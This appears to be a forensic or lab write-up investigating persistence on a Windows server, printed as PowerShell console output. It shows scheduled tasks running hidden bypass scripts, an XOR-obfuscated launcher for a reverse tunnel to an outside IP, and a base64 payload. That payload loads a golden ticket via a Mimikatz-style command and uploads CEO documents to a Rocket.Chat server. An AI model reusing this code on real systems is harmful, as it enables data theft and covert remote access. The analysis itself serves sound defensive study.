# Scheduled Tasks
```
PS C:\Users\Administrator> schtasks

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
Network_Share_Connection_Test            6/5/2026 8:45:01 AM    Ready
Windows Module Analysis Cache            6/5/2026 11:15:00 AM   Ready
```

# Network_Share_Connection_Test - Runs every 5 Minutes
```
C:\Program Files\PowerShell\7\pwsh.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "C:\Windows\System32\Network_Share_Scripts\Network_Share_Setup.ps1" 
```

# Windows Module Analysis Cache
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoLogo -NoProfile -ExecutionPolicy Bypass -File "C:\ProgramData\Microsoft\Windows\PowerShell\ModuleAnalysisCache\Components\WUModel\runtime\Invoke-WuModule.ps1"
```

# Invoke-WuModule
```
PS C:\Users\Administrator> gci C:\ProgramData\Microsoft\Windows\PowerShell\ModuleAnalysisCache\Components\WUModel\runtime\Invoke-WuModule.ps1


    Directory: C:\ProgramData\Microsoft\Windows\PowerShell\ModuleAnalysisCache\Components\WUModel\runtime


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/13/2026   8:49 AM            578 Invoke-WuModule.ps1

PS C:\Users\Administrator> type C:\ProgramData\Microsoft\Windows\PowerShell\ModuleAnalysisCache\Components\WUModel\runtime\Invoke-WuModule.ps1
$Global:ErrorActionPreference='Stop'
function _d([string]$a,[byte[]]$b){$c=[Convert]::FromBase64String(($a-replace'\s',''));$e=[byte[]]::new($c.Length);for($i=0;$i -lt $c.Length;$i++){$e[$i]=$c[$i]-bxor $b[$i%$b.Length]};[Text.Encoding]::UTF8.GetString($e)}
$k=@(99,111,117,110,116,101,114,115,116,114,105,107,101)
$p=_d (Get-Content -LiteralPath (Join-Path $PSScriptRoot 'pk.dat') -Raw) $k
& (Join-Path $PSScriptRoot 'Inner-ReverseTunnel.ps1') -KeyPath $p -RedirectorHost '203.0.113.150' -RedirectorUser 'accesscheck' -RemotePort 55985 -LocalWinRMPort 5985 -SessionMinutes 20
```

$k=counterstrike

# C:\Windows\System32\Network_Share_Scripts\
```
PS C:\Users\Administrator> gci C:\Windows\System32\Network_Share_Scripts\


    Directory: C:\Windows\System32\Network_Share_Scripts


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          6/5/2026   8:50 AM             35 lastrun.txt
-a----         3/27/2026   7:47 AM        1250056 Network_setup.exe
-a----         4/13/2026  12:48 PM           7454 Network_Share_Login.b64
-a----         4/13/2026  12:51 PM            485 Network_Share_Setup.ps1
```

# lastrun.txt
```
PS C:\Users\Administrator> type C:\Windows\System32\Network_Share_Scripts\lastrun.txt
2026-06-05T08:50:01.5777641-04:00
```

# Hash of Network_setup.exe
```
PS C:\Users\Administrator> Get-FileHash -alg md5 C:\Windows\System32\Network_Share_Scripts\Network_setup.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             E930B05EFE23891D19BC354A4209BE3E                                       C:\Windows\System32\Network_Share_Scripts\Network_setup.exe
```

# Network_Share_Login.b64 
```
PS C:\Users\Administrator> certutil -decode C:\Windows\System32\Network_Share_Scripts\Network_Share_Login.b64 C:\Windows\System32\Network_Share_Scripts\Network_Share_Login.txt

PS C:\Users\Administrator> type C:\Windows\System32\Network_Share_Scripts\Network_Share_Login.txt
# --- Configuration ---
$RocketChatUrl = "203.0.113.150:3000"
$RoomId        = "Rnjgmrjyzu4zTyDvz"
$AuthToken     = "MhbQ_Bh0ETL6TaEZ_4jZdYT-fJpxlLz-Y9KxbL3B190"
$UserId        = "fZvfWT7BbNHDgAgRG"
$LastRunFile   = "C:\Windows\System32\Network_Share_Scripts\lastrun.txt"   # File where the last run timestamp is stored
$Message       = "Uploaded from ShareDrive"
$FolderPath    = "\\nisa-dc\CEO_Documents"
# --- Load Golden Ticket for Authentication ---
C:\Windows\System32\Network_Share_Scripts\Network_setup.exe "kerberos::ptt C:\Windows\System32\Network_Share_Scripts\ticket.kirbi" exit
# --- Read last run time ---
if (Test-Path $LastRunFile) {
    $LastRunContent = (Get-Content $LastRunFile -Raw).Trim()
    if ([string]::IsNullOrWhiteSpace($LastRunContent)) {
        Write-Host "Last run file is empty  resetting to default value."
        $LastRun = (Get-Date).AddYears(-10)
    } else {
        try {
            $LastRun = [datetime]::Parse( $LastRunContent )
        } catch {
            Write-Host "Invalid date in last run file  resetting to default value."
            $LastRun = (Get-Date).AddYears(-10)
        }
    }
    Write-Host "Last run time: $LastRun"
} else {
    Write-Host "No last run file found. Assuming first run."
    $LastRun = (Get-Date).AddYears(-10)
}
# --- Find recently modified or created files ---
$FilesToUpload = Get-ChildItem -Path $FolderPath -File |
    Where-Object { $_.LastWriteTime -gt $LastRun }
if ($FilesToUpload.Count -eq 0) {
    Write-Host "No new or modified files since last run."
} else {
    Write-Host "Uploading $($FilesToUpload.Count) new/modified file(s)..."
    # --- Set up reusable headers ---
    $Headers = @{
        "X-Auth-Token" = $AuthToken
        "X-User-Id"    = $UserId
    }
    foreach ($File in $FilesToUpload) {
        Write-Host "Uploading: $($File.FullName)"
        $Form = @{
            file = Get-Item $File.FullName
            msg  = "$Message ($($File.Name))"
    }
        try {
            $Response = Invoke-RestMethod `
                -Uri "$RocketChatUrl/api/v1/rooms.upload/$RoomId" `
                -Headers $Headers `
                -Method Post `
                -Form $Form
            if ($Response.success) {
                Write-Host "  File uploaded successfully: $($File.Name)"
            } else {
                Write-Host "  Upload failed: $($File.Name)"
                $Response | ConvertTo-Json -Depth 5
            }
        } catch {
            Write-Host "  Error uploading $($File.Name): $($_.Exception.Message)"
        }
    }
}
# --- Update last run time ---
$Now = Get-Date
$Now.ToString("o") | Out-File -FilePath $LastRunFile -Force
Write-Host "Updated last run time to $Now"
```

# Network_Share_Setup.ps1
```
PS C:\Users\Administrator> type C:\Windows\System32\Network_Share_Scripts\Network_Share_Setup.ps1
$Path = "C:\Windows\System32\Network_Share_Scripts\Network_Share_Login.b64"

if (-not (Test-Path $Path)) {
    Write-Host "Payload file not found"
    exit
}

try {
    $Encoded = Get-Content $Path -Raw
    $Bytes   = [Convert]::FromBase64String($Encoded)
    $Decoded = [Text.Encoding]::Unicode.GetString($Bytes)

    # Execute the decoded script
    Invoke-Expression $Decoded
}
catch {
    Write-Host "Error decoding or executing payload: $($_.Exception.Message)"
}
```

# ticket.kirbi

```
PS C:\Users\Administrator> gci C:\Windows\System32\Network_Share_Scripts\ -Attributes hidden


    Directory: C:\Windows\System32\Network_Share_Scripts


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-h--         3/27/2026   8:52 AM           1479 ticket.kirbi
```